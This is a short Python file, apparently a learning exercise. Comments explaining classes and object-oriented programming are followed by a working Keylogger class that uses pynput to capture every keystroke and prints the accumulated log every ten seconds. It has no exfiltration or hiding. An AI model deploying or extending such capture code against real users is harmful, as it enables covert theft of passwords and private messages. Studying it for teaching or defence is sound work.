# Object Oriented Programming
# Classes allows us to write Object Oriented Programming
# Divide the class
# Can write as classes / it is a blue print how the code can be used
# the code is reusable, extend, maintain and fix issues if there were issues.
# Functions inside of classes are called Methods.
# we call this a method because we envoke the method
# on the class once we create an object on the class.


import pynput.keyboard
import threading

log = " "

class Keylogger:
    def process_key_press(self, key):
        global log
        try:
            log = log + str(key.char)
        except AttributeError:
            if key == key.space:
                log = log + " " 
            else:
                log = log + " " + str(key)+" "
         
    def report(self):
        global log
        print(log)
        log = " "
        timer = threading.Timer(10, self.report)
        timer.start()

    def start(self):    
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
        
